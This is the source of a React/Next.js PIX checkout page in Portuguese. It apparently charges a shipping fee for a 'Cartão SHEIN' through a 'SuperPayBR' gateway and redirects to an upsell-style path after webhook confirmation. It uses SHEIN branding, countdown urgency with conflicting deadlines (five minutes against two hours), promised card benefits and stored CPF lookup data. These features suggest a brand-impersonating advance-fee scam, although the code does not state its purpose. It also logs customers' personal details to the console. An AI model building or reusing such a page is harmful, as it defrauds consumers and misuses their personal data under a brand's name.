"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Clock, AlertCircle, RefreshCw } from "lucide-react"
import { usePureWebhookMonitor } from "@/hooks/use-pure-webhook-monitor"
import { useOptimizedTracking } from "@/hooks/use-optimized-tracking"
import { SmartQRCode } from "@/components/smart-qr-code"

interface InvoiceData {
  id: string
  external_id: string
  status: {
    code: number
    title: string
  }
  payment: {
    details: {
      qrcode?: string | null
      pix_code?: string | null
    }
  }
  prices: {
    total: number
  }
  type: "real" | "emergency" | "fallback"
}

export default function SuperPayBRCheckoutPage() {
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [connectionStatus, setConnectionStatus] = useState<"checking" | "ok" | "error">("checking")

  const router = useRouter()
  const searchParams = useSearchParams()
  const timerRef = useRef<NodeJS.Timeout | null>(null)

  // Obter parâmetros da URL
  const amount = searchParams.get("amount") || "34.90"
  const shipping = searchParams.get("shipping") || "sedex"
  const method = searchParams.get("method") || "SEDEX"

  // Optimized tracking
  const { track, trackPageView, trackConversion } = useOptimizedTracking({
    enableDebug: process.env.NODE_ENV === "development",
  })

  // PURE webhook monitoring
  const {
    status: paymentStatus,
    isWaitingForWebhook,
    error: webhookError,
    checkCount,
    maxChecks,
    lastCheck: lastWebhookCheck,
  } = usePureWebhookMonitor({
    externalId: invoice?.external_id || null,
    enableDebug: process.env.NODE_ENV === "development",
    onPaymentConfirmed: (data) => {
      console.log("🎉 PAGAMENTO CONFIRMADO VIA WEBHOOK SUPERPAYBR!")
      console.log("📊 Dados do pagamento:", data)

      // Track conversion
      trackConversion("payment_confirmed", data.amount)

      // Salvar confirmação no localStorage
      localStorage.setItem("paymentConfirmed", "true")
      localStorage.setItem("paymentAmount", data.amount.toFixed(2))
      localStorage.setItem("paymentDate", data.paymentDate || new Date().toISOString())
      localStorage.setItem("externalId", data.externalId || "")

      // Redirecionar para /upp/001 (fluxo checkout)
      console.log("🚀 Redirecionando para /upp/001...")
      setTimeout(() => {
        window.location.href = "/upp/001"
      }, 2000)
    },
    onPaymentDenied: (data) => {
      console.log("❌ PAGAMENTO NEGADO VIA WEBHOOK SUPERPAYBR!")
      track("payment_denied", {
        amount: data.amount,
        reason: data.statusName,
      })
      setError("Pagamento foi negado. Tente novamente.")
    },
    onPaymentExpired: (data) => {
      console.log("⏰ PAGAMENTO VENCIDO VIA WEBHOOK SUPERPAYBR!")
      track("payment_expired", { amount: data.amount })
      setError("Pagamento expirou. Gere um novo PIX.")
    },
    onError: (error) => {
      console.error("❌ Erro no monitoramento webhook:", error)
      track("payment_monitoring_error", { error })
    },
  })

  // Track page view on mount
  useEffect(() => {
    trackPageView("/checkout")
    track("checkout_page_loaded", {
      amount: Number.parseFloat(amount),
      shipping_method: method,
    })
  }, [trackPageView, track, amount, method])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0 && invoice && !paymentStatus?.isPaid) {
      timerRef.current = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
    } else if (timeLeft === 0) {
      setError("Tempo expirado. Gere um novo PIX.")
      track("payment_timeout", { amount: Number.parseFloat(amount) })
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current)
    }
  }, [timeLeft, invoice, paymentStatus?.isPaid, track, amount])

  // Verificar conexão e criar fatura
  useEffect(() => {
    checkConnectionAndCreateInvoice()
  }, [])

  const checkConnectionAndCreateInvoice = async () => {
    try {
      setLoading(true)
      setError(null)
      setConnectionStatus("checking")

      console.log("🔍 Verificando conexão SuperPayBR...")

      // Primeiro, testar conexão
      const testResponse = await fetch("/api/superpaybr/test-connection")
      const testResult = await testResponse.json()

      if (testResult.success) {
        console.log("✅ Conexão SuperPayBR OK")
        setConnectionStatus("ok")
      } else {
        console.log("⚠️ Problemas na conexão SuperPayBR:", testResult.error)
        setConnectionStatus("error")
      }

      // Criar fatura independentemente do teste de conexão
      await createInvoice()
    } catch (error) {
      console.log("❌ Erro na verificação de conexão:", error)
      setConnectionStatus("error")
      await createInvoice() // Tentar criar mesmo assim
    }
  }

  const createInvoice = async () => {
    try {
      console.log("🔄 Criando fatura PIX SuperPayBR...")
      console.log("Parâmetros:", { amount: Number.parseFloat(amount), shipping, method })

      // Gerar external_id único
      const externalId = `CHECKOUT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

      // Track invoice creation start
      track("invoice_creation_started", {
        amount: Number.parseFloat(amount),
        shipping_method: method,
        external_id: externalId,
      })

      // Carregar dados do usuário do localStorage
      const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
      const userEmail = localStorage.getItem("userEmail") || ""
      const userWhatsApp = localStorage.getItem("userWhatsApp") || ""
      const deliveryAddress = JSON.parse(localStorage.getItem("deliveryAddress") || "{}")

      console.log("📋 Dados do usuário SuperPayBR:", {
        nome: cpfData.nome,
        email: userEmail,
        whatsapp: userWhatsApp,
        endereco: deliveryAddress,
      })

      const response = await fetch("/api/superpaybr/create-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: Number.parseFloat(amount),
          external_id: externalId,
          customer_name: cpfData.nome || "Cliente Shein Card",
          customer_email: userEmail || "cliente@sheincard.com",
          customer_cpf: cpfData.cpf || "",
        }),
      })

      const data = await response.json()

      if (data.success) {
        setInvoice(data.data)
        localStorage.setItem("superPayBRInvoice", JSON.stringify(data.data))
        localStorage.setItem("currentExternalId", data.data.external_id)

        console.log(`✅ Fatura SuperPayBR criada: ${data.data.type} - Valor: R$ ${data.data.prices.total.toFixed(2)}`)
        console.log(`🆔 External ID: ${data.data.external_id}`)
        console.log(`👤 Cliente: ${cpfData.nome || "N/A"}`)

        if (data.emergency_mode) {
          console.log("🚨 Modo emergência ativado")
        }

        // Track successful invoice creation
        track("invoice_created", {
          external_id: data.data.external_id,
          amount: data.data.prices.total,
          type: data.data.type,
          customer_name: cpfData.nome,
          emergency_mode: data.emergency_mode,
        })
      } else {
        throw new Error(data.error || "Erro ao criar fatura SuperPayBR")
      }
    } catch (error) {
      console.log("❌ Erro ao criar fatura SuperPayBR:", error)
      setError("Erro ao gerar PIX SuperPayBR. Tente novamente.")

      // Track error
      track("invoice_creation_error", {
        error: error instanceof Error ? error.message : "Unknown error",
        amount: Number.parseFloat(amount),
      })
    } finally {
      setLoading(false)
    }
  }

  const copyPixCode = async () => {
    if (!invoice?.payment?.details?.pix_code) return

    try {
      await navigator.clipboard.writeText(invoice.payment.details.pix_code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)

      // Track PIX code copy
      track("pix_code_copied", {
        external_id: invoice.external_id,
        amount: Number.parseFloat(amount),
      })
    } catch (error) {
      console.log("❌ Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Função para simular pagamento (apenas para testes)
  const simulatePayment = async () => {
    if (!invoice?.external_id) {
      console.log("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando pagamento SuperPayBR para:", invoice.external_id)

      const response = await fetch("/api/superpaybr/simulate-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          external_id: invoice.external_id,
          amount: Number.parseFloat(amount),
          redirect_type: "checkout",
        }),
      })

      const result = await response.json()

      if (result.success) {
        console.log("✅ Pagamento SuperPayBR simulado com sucesso!")
        track("payment_simulated", {
          external_id: invoice.external_id,
          amount: Number.parseFloat(amount),
        })
      } else {
        console.error("❌ Erro na simulação:", result.error)
      }
    } catch (error) {
      console.error("❌ Erro na simulação SuperPayBR:", error)
    }
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-black mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Gerando PIX SuperPayBR...</h2>
            <p className="text-gray-600 mb-2">Sistema 100% baseado em webhooks</p>
            <div className="text-sm text-gray-500">
              <p>Valor: R$ {Number.parseFloat(amount).toFixed(2)}</p>
              <p>Método: {method}</p>
              <p>
                Status:{" "}
                {connectionStatus === "checking"
                  ? "Verificando..."
                  : connectionStatus === "ok"
                    ? "✅ Conectado"
                    : "⚠️ Modo Fallback"}
              </p>
            </div>
          </div>
        </div>
      </main>
    )
  }

  if (error && !invoice) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold mb-2 text-red-600">Erro no Pagamento</h2>
            <p className="text-gray-600 mb-4">{error}</p>
            <button
              onClick={checkConnectionAndCreateInvoice}
              className="bg-black text-white px-6 py-2 rounded-lg hover:bg-black/90 transition-colors flex items-center gap-2 mx-auto"
            >
              <RefreshCw className="w-4 h-4" />
              Tentar Novamente
            </button>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
            <h1 className="text-2xl font-bold mb-2">Pagamento PIX</h1>
            <div className="flex items-center justify-center gap-2 text-sm">
              <span className="text-gray-500">SuperPayBR</span>
              {connectionStatus === "ok" && <span className="text-green-600">✅</span>}
              {connectionStatus === "error" && <span className="text-yellow-600">⚠️</span>}
              {invoice?.type === "emergency" && <span className="text-orange-600 text-xs">(Modo Emergência)</span>}
            </div>
          </div>

          {/* Debug Info */}
          {process.env.NODE_ENV === "development" && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4 text-xs">
              <p>
                <strong>External ID:</strong> {invoice?.external_id}
              </p>
              <p>
                <strong>Tipo:</strong> {invoice?.type}
              </p>
              <p>
                <strong>Conexão:</strong> {connectionStatus}
              </p>
              <p>
                <strong>Monitorando:</strong> {isWaitingForWebhook ? "✅ Sim" : "❌ Não"}
              </p>
              <p>
                <strong>Status:</strong> {paymentStatus?.statusName || "Aguardando"}
              </p>
              <p>
                <strong>Pago:</strong> {paymentStatus?.isPaid ? "✅ Sim" : "❌ Não"}
              </p>
              <p>
                <strong>Verificações:</strong> {checkCount}/{maxChecks}
              </p>
              <p>
                <strong>Última verificação:</strong>{" "}
                {lastWebhookCheck ? new Date(lastWebhookCheck).toLocaleTimeString() : "N/A"}
              </p>
            </div>
          )}

          {/* Mensagem de Atenção */}
          <div className="bg-yellow-100 border-l-4 border-yellow-500 rounded-lg p-4 mb-6">
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <span className="text-yellow-600 text-lg">⚠️</span>
              </div>
              <div className="ml-3">
                <h3 className="text-yellow-800 font-bold text-sm mb-2">ATENÇÃO! ⏳</h3>
                <div className="text-yellow-700 text-sm space-y-2">
                  <p>
                    Para garantir o envio do seu <strong>Cartão SHEIN</strong>, este pagamento deve ser confirmado em
                    até <strong>2 horas</strong>. Após esse prazo, a sua solicitação será automaticamente cancelada, sem
                    custos adicionais.
                  </p>
                  <p>
                    Ao confirmar o pagamento do frete, você garante todos os benefícios exclusivos:{" "}
                    <strong>cashback, parcelamento sem juros e uso imediato do cartão</strong>.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Timer */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-center space-x-2">
              <Clock className="w-5 h-5 text-yellow-600" />
              <span className="font-bold text-yellow-800">Tempo restante: {formatTime(timeLeft)}</span>
            </div>
          </div>

          {/* Success Message - Only show when paid */}
          {paymentStatus?.isPaid && (
            <div className="bg-green-100 border border-green-300 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="w-5 h-5 text-green-600" />
                <span className="font-bold text-green-800">✅ Pagamento Confirmado!</span>
              </div>
              <p className="text-green-700 text-sm mt-2 text-center">
                Confirmado via webhook - Redirecionando para /upp/001...
              </p>
            </div>
          )}

          {/* Valor */}
          <div className="text-center mb-6">
            <p className="text-gray-600 mb-1">Valor a pagar</p>
            <p className="text-3xl font-bold text-green-600">R$ {Number.parseFloat(amount).toFixed(2)}</p>
            <p className="text-sm text-gray-500">Frete {method} - Cartão SHEIN</p>
          </div>

          {/* QR Code */}
          <div className="text-center mb-6">
            <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
              {invoice && (
                <SmartQRCode
                  qrCodeUrl={invoice.payment?.details?.qrcode}
                  pixCode={invoice.payment?.details?.pix_code}
                  size={200}
                  className="mx-auto"
                />
              )}
            </div>
            <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
          </div>

          {/* Código PIX */}
          {invoice?.payment?.details?.pix_code && (
            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={invoice.payment.details.pix_code}
                  readOnly
                  className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
                />
                <button
                  onClick={copyPixCode}
                  className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                    copied ? "bg-green-500 text-white" : "bg-black text-white hover:bg-black/90"
                  }`}
                >
                  {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                </button>
              </div>
              {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
            </div>
          )}

          {/* Instruções */}
          <div className="space-y-3 text-sm text-gray-600">
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                1
              </span>
              <span>Abra o app do seu banco</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                2
              </span>
              <span>Escaneie o QR Code ou cole o código PIX</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                3
              </span>
              <span>Confirme o pagamento</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                4
              </span>
              <span>Aguarde confirmação automática via webhook SuperPayBR</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                5
              </span>
              <span>Redirecionamento automático para /upp/001</span>
            </div>
          </div>

          {/* Observação Importante */}
          <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <span className="text-blue-600 text-lg">ℹ️</span>
              </div>
              <div className="ml-3">
                <h4 className="text-blue-800 font-bold text-sm mb-1">Importante:</h4>
                <p className="text-blue-700 text-sm">
                  <strong>Aguarde a confirmação automática!</strong> Não feche esta página após o pagamento. O sistema
                  detectará automaticamente quando o pagamento for processado e redirecionará você para a próxima etapa.
                </p>
              </div>
            </div>
          </div>

          {/* Botão de Teste (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && invoice?.external_id && (
            <button
              onClick={simulatePayment}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              🧪 SIMULAR PAGAMENTO APROVADO (TESTE)
            </button>
          )}

          {/* Status do Monitoramento */}
          {isWaitingForWebhook && (
            <div className="mt-4 text-center">
              <div className="inline-flex items-center space-x-2 text-sm text-blue-600">
                <div className="animate-pulse w-2 h-2 bg-blue-600 rounded-full"></div>
                <span>
                  Aguardando webhook ({checkCount}/{maxChecks})...
                </span>
              </div>
            </div>
          )}

          {/* Erro do Webhook */}
          {webhookError && (
            <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-3">
              <p className="text-red-700 text-sm">⚠️ Erro no monitoramento: {webhookError}</p>
            </div>
          )}
        </div>
      </div>
    </main>
  )
}
